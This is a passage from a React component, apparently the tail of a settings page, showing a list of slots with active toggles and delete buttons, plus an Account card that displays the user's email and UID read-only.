                <input type="checkbox" checked={slot.active} onChange={e => updateSlot(slot.id, { active: e.target.checked })} className="w-3.5 h-3.5 accent-brand-600" />
                <span className="text-xs text-slate-500">Active</span>
              </label>
              <button onClick={() => deleteSlot(slot.id)} className="p-1 text-slate-400 hover:text-red-500 transition-colors flex-shrink-0"><Trash2 className="w-4 h-4" /></button>
            </div>
          ))}
        </div>
      </div>

      {/* Account */}
      <div className="card p-5 space-y-3">
        <div className="pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <p className="text-sm font-semibold text-slate-900 dark:text-white">Account</p>
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Email</label>
            <input type="text" value={user?.email ?? ''} readOnly className="input w-full text-sm bg-slate-50 dark:bg-slate-800 cursor-default" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">UID</label>
            <input type="text" value={user?.uid ?? ''} readOnly className="input w-full text-sm font-mono text-xs bg-slate-50 dark:bg-slate-800 cursor-default" />
          </div>
        </div>
      </div>

      <Toast msg={toast} error={toastError} />
    </div>
  );
}
